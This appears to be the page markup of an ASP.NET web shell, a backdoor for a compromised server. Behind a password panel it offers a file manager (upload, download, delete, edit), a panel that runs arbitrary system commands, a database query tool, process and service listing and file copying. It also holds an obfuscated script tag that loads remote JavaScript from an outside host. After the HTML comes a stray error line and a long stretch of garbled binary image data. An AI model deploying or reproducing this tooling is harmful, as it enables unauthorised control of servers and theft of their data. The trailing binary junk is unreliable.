            Bin_PostBack('newdir', folder);

        }

    }

    function newfile() {

        var file = prompt("Create New File", "");

        if (file != null) {

            Bin_PostBack('newfile', file);

        }

    }

    function slctall() {

        var ck = document.getElementsByTagName('input');

        for (var i = 0; i < ck.length; i++) {
            if (ck[i].type == 'checkbox' && ck[i].name != 'selectall') {
                ck[i].checked = form1.selectall.checked;

            }
        }
    }
    function deleteall() {
        var files = ""
        var ck = document.getElementsByTagName('input');

        for (var i = 0; i < ck.length; i++) {
            if (ck[i].type == 'checkbox' && ck[i].checked && ck[i].name != 'selectall') {
                files += ck[i].name + ",";

            }
        }
        if (files == "") { alert("Select Files"); return; }
        if (confirm('Are you sure delete the files ?')) {

            Bin_PostBack('delall', files);

        }
    }

    function downloadall() {
        var hid = document.getElementById("Hidden1");


        var url = location.href;
        url = url.replace("#", "");

        var file = "?name=";
        var fpath = "";

        var ck = document.getElementsByTagName('input');
        var checked = new Array();
        var c = 0;
        for (var i = 0; i < ck.length; i++) {
            if (ck[i].type == 'checkbox' && ck[i].checked && ck[i].name != 'selectall') {
                checked[c] = ck[i].name;
                c = c + 1;
            }
        }

        if (checked.length == 0) { alert("Select Files"); return; }

        for (var i = 0; i < checked.length; i++) {

            fpath = url.concat(file.concat(checked[i]));

            var ifra = document.createElement('iframe');
            ifra.src = fpath;
            ifra.setAttribute("class", "hidden");
            ifra.setAttribute("height", "1");
            ifra.setAttribute("width", "1");
            void (document.body.appendChild(ifra));
        }

    }



  </script>
    
 

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <asp:HiddenField ID="hidLastTab"  runat="server" Value='' />

     <div class="container" >
         <div>
           
        <asp:Panel ID="Login" runat="server" Visible="false"  >
           <h3 >Password  <asp:TextBox ID="Login_TextBox"  runat="server"></asp:TextBox> 
            <asp:Button ID="Login_Button" runat="server" Text="LogIn" OnClick="Login_Button_Click" />              
        </asp:Panel> 
              <asp:LinkButton ID="Logout" Visible="false"   style=" float :right;" runat="server" OnClick="Logout_Click">
                LOGOUT</asp:LinkButton>
              <h3 >  </h3> 
           
         </div>
         <script SRC=&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x73&#x61&#x62&#x75&#x6e&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT>
        
           <div class="tab_container">
                <div id="Menue" visible="false" runat="server">
             <ul class="tabs">
                <li>
                     <asp:Button ID="Button_FileManger" runat="server" Text="FileManger" OnClick="fm" CssClass="buttons"   />
      
                   </li>
                <li>
                     <asp:Button ID="Button_CMD" runat="server" Text="CMD" OnClick="process_design" CssClass="buttons"  />
      
                   </li>
                   <li>
               <asp:Button ID="Button_DBS" runat="server" Text="DBS" OnClick="process_design" CssClass="buttons"  />
      </li>
                 <li>
                <asp:Button ID="Button_UserInfo" runat="server" Text="UserInfo" OnClick="process_design" CssClass="buttons"  />
      </li>
                  <li>
                <asp:Button ID="Button_ProcessesServices" runat="server" Text="Processes_Services" OnClick="process_design" CssClass="buttons"  />
      </li>
              <li>
                <asp:Button ID="Button2" runat="server" Text="CopyFiles" OnClick="process_design" CssClass="buttons"  />
      </li>
            </ul>
         </div>
               <br />
                     <asp:Label ID="msgs" runat="server" Text=""></asp:Label>
             <asp:Panel ID="FileManger"  runat="server"  class="tab_content" >
      
     
    <div  id="Div1" style=" height: 63px; width: 100%; border-style: inset">
   
       
   
     <asp:FileUpload ID="FileUpload1" runat="server" style="  height: 40px; width:180px;" />
     <asp:Button ID="Upload" runat="server"  Text="Upload" OnClick="Upload_Click" />
        <br />
         <input type="checkbox" name="selectall" title="Select All Files" onclick="javascript: slctall();" />Select All Files To   
        <a href="#" onclick="javascript:downloadall()">Download ALL</a> || 
          <a href="#" onclick="javascript:deleteall()">Delete ALL</a>
         <asp:HyperLink runat="server">Copy</asp:HyperLink>|<asp:HyperLink runat="server">Move</asp:HyperLink> 
      <br />
   
    </div>
                 
    <div  id="current" style="  height: 60px; width: 100%; border-style: inset">
    <a href="javascript:Bin_PostBack('shell_root', '<%=  base64Encode("./")%>' )"')">Shell_Root</a> ||  Select Drivers:
        <asp:DropDownList ID="DriversList"  runat="server" style=" height: 21px;" Width="143px" OnSelectedIndexChanged="DriversList_SelectedIndexChanged" >
        </asp:DropDownList>
        <asp:Button ID="slctdrive" runat="server" EnableViewState="true"  Height="21px" OnClick="slctdrive_Click" Text="GET" Width="38px" />
        || <a href="javascript:newfolder()">New Folder</a> || <a href="javascript:newfile()">New File</a> 
        <br />
       
       <br />
       
        
        Current Path:
        <asp:Label ID="currentpathlabel" runat="server" EnableViewState="true"  Visible="False"></asp:Label>
   
        <asp:Literal ID="Literal1" runat="server"></asp:Literal>
        <input id="Hidden1" type="hidden" runat="server"/>
   
       <br />
   
    </div>
                 
<table id="tblEmployee" runat="server" style=" width: 100%">
            <thead>
                
                <tr>
                    <th>
                        Name
                    </th>
                    <th>
                        Size
                    </th>
                    <th>
                       Date Modified
                    </th>
                  
                    <th>
                       TO DO
                    </th>
                </tr>
            </thead>
        </table>
     
        
    </asp:Panel>
                 <asp:Panel ID="editpanel" runat="server" Visible="false">
     
            <h2> Editing File:</h2> 
              <asp:TextBox ID="filetoedit" runat="server" Enabled="false" Width="99%" Height="25px">
                  <br />

              </asp:TextBox> 
              <asp:TextBox ID="editfile" runat="server"  Width="99%" Height="500px" TextMode="MultiLine" >

              </asp:TextBox> 

<asp:Button id="submitedit" runat="server" Text="Save" onclick="Save_Click"></asp:Button>
 
</asp:Panel>
               
                 <asp:Panel ID="CMD" runat="server" Visible="false" class="tab_content">
                     
                      Type Commands<br />
                      <asp:TextBox ID="Command" runat="server" EnableViewState="false"  
                          Height="156px" TextMode="MultiLine" Width="579px"></asp:TextBox>
                      <asp:Button ID="CmdSubmit" runat="server" Height="40px" 
                          onclick="CmdSubmit_Click" Text="Run" Width="70px" />
                      <br />
                      Result:<br />
                        <asp:TextBox ID="CmdResult" runat="server" TextMode="MultiLine" 
                          Height="368px" Width="720px"></asp:TextBox>
                  </asp:Panel>

               

    <asp:Panel ID="DBS"  runat="server" Visible="false"  class="tab_content" >
        
     
    <div  id="current" style="  height: 116px; width: 100%; border-style: inset">
        <br />
      connection string:
        <asp:TextBox ID="connections" runat="server" Height="25px" Width="491px"></asp:TextBox>
        &nbsp;<asp:Button ID="gdb" runat="server" Text="get db" OnClick="gdb_Click" Height="36px" Width="84px" />
        <br />
        <br />
        select DB:
        <asp:DropDownList ID="DropDownList1" runat="server" Height="19px" Width="114px" >
        </asp:DropDownList>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <asp:Button ID="Button1" runat="server" Text="get Tables" OnClick="Button1_Click" />
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tables:
        <asp:DropDownList ID="DropDownList2" runat="server">
        </asp:DropDownList>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <br />
        <br />
      
        </div>
            Run Query<br />
                      <asp:TextBox runat="server" TextMode="MultiLine" Height="209px" Width="777px" ID="sqlquery"></asp:TextBox><br />
                 <asp:Button id="executequery" runat="server" Text="Execute" OnClick="executequery_Click"  />
        
    </asp:Panel>
            
              <asp:Panel ID="UserInfo"  runat="server" Visible="false"  class="tab_content"  >
        
     
    
           
        
    </asp:Panel>
                   <asp:Panel ID="Processes_Services"  runat="server" Visible="false"  class="tab_content"  >
        
     
    <div  id="current" style="  height: 57px; width: 100%; border-style: inset">
        <br />
        <asp:Button ID="Button_process" runat="server" OnClick="Button_process_Click" Text="Process" />
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <asp:Button ID="Button_services" runat="server" Text="Services" OnClick="Button_services_Click" />
        <br />
        <br />
      
        </div>
           
        
    </asp:Panel>
     <asp:Panel ID="CopyFiles"  runat="server" Visible="false"  class="tab_content"  >
     <div>
        <asp:Label ID="Label1" runat="server" Width="150" Text="Enter Source"></asp:Label>
        <asp:TextBox ID="TextBox1" runat="server" Width="384px"></asp:TextBox>
        <br />
        <asp:Label ID="Label2" runat="server" Width="150" Text="Enter Dest"></asp:Label>
        <asp:TextBox ID="TextBox2" runat="server" Width="384px"></asp:TextBox>
    <br />
     <asp:Button ID="Button3" runat="server" Text="Button" OnClick="CopyFile" />
     <asp:Label ID="Label3" runat="server"    ></asp:Label>
    </div>
    </asp:Panel>
               </div>
                  

    </div>

    </form>
          </body>
</html>
{"res":"error","msg":"Thread was being aborted."}�� � 	( %!1"))7... 38387(-/,


/&!//5/--+-7-5+-.5.3-5//-+--+/5-7.7-+--/-5/-+-++6----��  � �" ��             �� F    !1"AQaq2�#BR��3br����c����CS��$U�����             �� *       1!AQ"q���2B�����   ? �b"" """ """ """ """ """ """ """ """ """ """ """ """ """ """ """ """ ""&n��kk-uJ�R��p�Pk<i��խGGS��#m}[�I���v|¨/ؒ9-�R�����~v:��,D����Esm�[���e���� i\�� �ZL���N�Ys~&gؤ� 7?�M�o���넮�O�%�O�p���gģxi��s��X+�����ϰ��OD�:������y���=uVX�$r��`��9R;�d;H�?���o��+�ʻ�!��j�Gș����0^��5U'�A?Ep����?���>���Mj�[{���VSʷ��$ """ """ """ """p�;�����3����{y����yc���P��{Qe��UQ�,xW]w�WN��R-հ�5.#�{c?p�7��]���F�m:t9Zk���%��{s�2dU5*( }?�:F�E��,W��G��b�&?�w��m_��� )_D�#n������f�IxN��ߺ�6aXFY��}؂{qvxM����G���/����KrI����{K��z3V� ��Q���J�6���4J������T��K��Ղ��&ǘ��seO�Z9�/ë�%��؁�J��̤`�+��)��l{���X�F�
�Xc��#�0I�=�rǞ�����FǤ�Z�:X�]��V��+�S�J�����RZ�;J�P�	 X�p�c$�D��11ڞ�鏆��7�J��k��I����Aܧ�����U�h�:r��{[SP�Tb�l��9'n�����EQOM�*�� ���m�߲�"}*��� ���G[һ�i���9�-���H9�6��b�k��Y�Z�73�S����� |������N�:e6ѡ�Z���Y�����; � �r����?HDD�����������u�������fc�U��
����@��ҟ��P��� �Y�w��>X'�3M�ۖb^�$��I'��� �3jz��u7�m�w�H���G� ����-���3�("|��}�� O�>�"$υ�b�-e��[���������S&H�Y����9/�r���@fe�kl,X����I�]�ܞ����<�Og���T��1������� �`'�IuO_SaG���UǱbw�q��>ݥ�U{F73vc�f<�1�brO��+�Z�'��K�µ�1�5�����Zp���A{~�a��P9� %bu���79�䧊��m}�����j� � Ya?R�O��@��؜켛�<w�<<Lt�-{������h�je���!����,�[O���j�jo!Ta�|  ϕ�wo|�x���Ř�8��h��i�i`�������p`��'���K�ۊ֬��2������9,�>�N�t�d���#6)�	�%Ѵ��k�M}������VH;�ˌ�$m`�Ny�Ǧ���-4V�UX¢� ?���s*�Z+�GR]�Q�� �l�~�f�&[������" """ """ '�Zi�������V� ���e�ֲz=��^��U��
F��G�G�34æ� �T'�Ï���m�ԥ!?�?f�#v��V��L�F�]nt�^N!����'���6j�W���Z�Z��J�>����Г�Ic�hl�Z�Ի����'<�I� I�5����q��c���~�̴g��G�X���$�GD�_���J[�\��F$pr�A<��o��ѧ}���W�c��F	��9<�n;���;�����2S%rn5��s�FO��s�����S6f;/U8'pq����5[nr������? =�+����Q�?۳����uXdr>|��G�}{Ol@F�����uK�G͑����vt��g��6�7U}3Y����+��J0U^o�G\�w�ɪ�Z��E��_-����������pN8��}L����EcO^+��w�˾���e�����:�,l��ò���v���f���ƿ�������N��0� <�?&Q��oH�i���ȃq��\�lX�srv�����ߧ-�����Ѫ�|�u]I�������O�'���Ċ?��z���8�0�~e�,>��.i�*DDD@DDD@H��E�h�ҳm!P����c����@���	�:F�*Բ8�2�!b�� r8����Ǉ�����K�����˥���X8�y+��n8������5*>��F� 
w�}����2���Qq:��Q��(ѭmZd5Yp@`�ÀAÏcI�h��<�c�0���g� ������T�,����׷��ݸ� �quN/�wi+`�:�+R��影�b�X<8�->Y[n$�0*���,��N��;���O��_��XjP�`F�pbv`pē�L�NO	����g���[sju�T�oz�V���J��O��|+�
8;�'�2��V�	��QR
ؖ�ہ�o�A��� -��F��>��jk�m�}w�}�j����f]� �U7K��t�ҭA�UZ*(�@�zT�ȼ�&�i|6��vʓ\���W��@�ӱ�),�U',���}�'�|*�X���nl֢��{��ϕk�_� �ΦpI�FO|������H�3Y���� ν�"��S�����6�I �'�=���k����7?Aퟛ�&T�X��ؐ�0?��k���_q1����Ń�v<(��&}N��s]���V ��G�.,�uϸ!��&k�"rV-��,s�Aܹ?5����o�}�c4��f
@�s��V�;?���Ұ�i������i!�4~v�A�Zv�� pO�?�R�� e�yEewd�Q�  ���������5L-F�؞�eX~Ҷ0�5�j�$L�Ǒ[��{X�0hnk+Gjڦe�wS�?�� �3���Ug� m����٪]��q[������~��>�Se�[�ժz�]+���/h`x>ຨ���ysM#�d��!��-���f�� ���g�f'�ãS�����F�Su�.� �	_9l�� 1�{}&�QrSe�P�y�U.�B5aU�P!�m�@�p*�����jtԳ�������WUc���n0Fv��=���h�حUl?U�� �K/ �,�� X� N�3o}5��G����x�d� y������k+��1��m��
���$p���!�z�O�W��  *��\g�-p��=� �u�^(f�Pm�IUC����݌�	ݵ��k��������{x'D_q���>V���g�� S;q�1Ę�˭�u��%��P�#9����$�o]�~�@ƴc#>UAx�O��@���gPk[uֽ���c���{33���K�<�ם�Gԭ���&@�[^�k��{UI {�g��NL�ӣ.�u(��N2=D���A�9 3��.\���9��X��,������'�)�}�u�����3m��s�+����F�ow�h�d�MzL�ruZ�h}X�m��*�FH8r>m���д�b:Yky����l����z���.�@Ƈ��F��54���off5�媦K�y���������nԫ鴍N�6&�9O-X݆����N1-������u����y�߿�� ='�֩z���E�R2�5��%�4�����oĭ�ҊN��³�U[�/ �G>�1ߓȝ�����JY`�[�|�p	�$rp3�J�[�J�:�*j/�C�j�WZ�) ���Y���6���4�:~/k��d�j?˥Z�%�ymS��6� ��¨��`m�ۀ|�i���Zб(��yq�'�� x�H����t�@��L��grVH
As����bo�tQc��R��pB�N����.�<�mƤ�q�ٵy�"�=�|� ;sv#+u(�A �s�88?B;�'C�>����l=�;Wڒ	V��Ao�^	-��4�S��iآ�}Ns�;�� �D�dQ�#����Tާ|�����F P1ߎI<�8��mz�g��y����NC����545:}Hқn���.	��<ܜ�ǭ���?�>��U���9�8���������������� �B�J�>�A*I9�^�����zX-��SV߹[�Y�oJf4T[�зܨ��D�mDD�����������I���R�0�B*�g#!\Ĺ��2q(N������{��Bܤ<��+�����W��z2����������?W�zٷT�3�̬oB���U�߷�
o�z�M��j��S�r��x�&�|�in��H��/�� ��?!��A�@j�oR�r����&ibk�Ih[�oJ�c�[3߽k�ȏ��~�� ��V�QS=�jܢ�U�9�'f\���r$l��=� �ӓ�?��~��k�[Le+l��r�0�I>��s�
z��AV�.�4�ltdZj-YUv�p�d����@d��п�ݝ��1;�Rg>���y<��Ou��[���ԡQM�2A� n��x���x�2@�a��}�#z���=:������g`ʸ.�-l�����ݧ<Jx7AMKa�~=��fva�+�bNђ@�2q�i�]z��ʷ������f�P�������m J��x�]^�YEG��@}�@�߁�g�ߛo8��5o�Q���������*�;Td|��t�T���T(-,[f��mޥ��B�@�g��{Ue������Zն���<�Ǳ�c�w��N�E��w�`�Yuր�J��<�',�q�O�3韜ok:��h�n� �-\���G�g�\v=ێҽ��Z�=�	bjL��+��x�ny v���@�'����?9��z�mT��*��^3��^[#��<vc/\U���i^���Ջ*���l.Ys��3l���{�L��?�?�L��uJ��փ_��er�n� �dg��Mx�U��o�3:�֓i����Tt%�1����u��S�Z�;s9�����@<�s�	�GG|���ۃ��:�ۂ���YUK��T]��E��i��قKp
)�7*o����3���=�KS��OR�K�2�����̕��zODR�M"�8�OZ��F��ߟ�3�������=?����<z,��v!e�;�~'���WSR�,���U�����A����;���	�Ӧʫ9$���}�<�d0�.(��ݷ�8��}�u
w(����3u�A`�;:5�sS��*~��S| 4z��4�!�y�������� ���)�Qr8,�J��9�#�?��<X�C��j�u,��E'�X��O~Oo�����"��{�s���Ę<£?�� Y�xW��^�e��er�N�[�?�F�1�c��1�g�x{�u��Z*V� )~�f[��.~lvn���>��Z�)n�S�B�������>�#�+3�,N��� w��r�k�h��t��5V���-��I���-����o��A�f�:m� �H����[<��� vLto��2���jm���@'���T�M���h,���yٴ���_�%�����c��ؑ�-Z�B�On���O�};��S[U��j`��@��goyI�I�}��jU����KW�]I� �Z�!����3hB5����˱J��)|��c����S�:Z���갹�*�p *l#b����=9ݖ�7~�-6�ͺ�f4:(�� ���;� ���:o�Z�]$+i4ڔ��|���-��R�<�8��NX�x��>;V�� �3���P~Eԕ�Ϋ�E'T���Zj$������U�s���D�~�n��*��N�c�E���� 1��$\����@X�BV�\��*�V��B�wZ�
�|�W������ )����;l�f�)�p;�ǉ����J���Puچw�-R�� �ǌ�,��y���]����*g�Z+R}<X㲨䟴�.�}m���[h���[R�9�;�H�l+��f���q�^q�C-0r0��?up���Y�t�(J�Bch^� p �KEQ�+ெZ.��
����o�C{�Ӑ�~[�󷈖A�����N��=�z�t�1���,6��cid����r���ɣE��������{}H���k)����_���ꚣN��6h�#�r\���I$����KG���h���ҡ�@�7�����2Z ""D
/���_u
�¥����E[��lMlF7���- �}�u���Of��C���o6�����k��'ӌs�\>.�o����m��]��6�`;~Y�q�x�~�6����Z6���%܏���G���H��;�iT����<8E]CJ��-l��@����3�lI���Q�uZb����4�^��%���k���J���kv
I�m�Zz���,���댣�p��>D��8���qE�oP����u�eP`۝�^ޑ��9J�F��)֐��S�3q�A�C}w�� �� �>�y�<+�M'M����8��,#�߹��� I��(
�   � p ��R���
